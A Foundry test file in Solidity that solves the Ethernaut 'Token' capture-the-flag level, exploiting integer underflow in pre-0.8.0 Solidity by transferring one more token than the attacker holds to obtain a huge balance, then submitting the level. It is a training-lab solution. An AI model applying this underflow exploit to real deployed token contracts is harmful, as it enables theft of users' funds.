// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/05-Token/TokenFactory.sol";
import "../core/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // In solidity < 0.8.0 there are no underflow / overflow checks
        // It is possible to leverage this to get a very large amount of token
        // By causing an overflow, it will assign type(uint256).max token to the attacker
        // and _initialSupply + initial balance of attacker to the token contract creator
        uint256 attackerBalance = ethernautToken.balanceOf(attacker);
        ethernautToken.transfer(address(tokenFactory), attackerBalance + 1);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
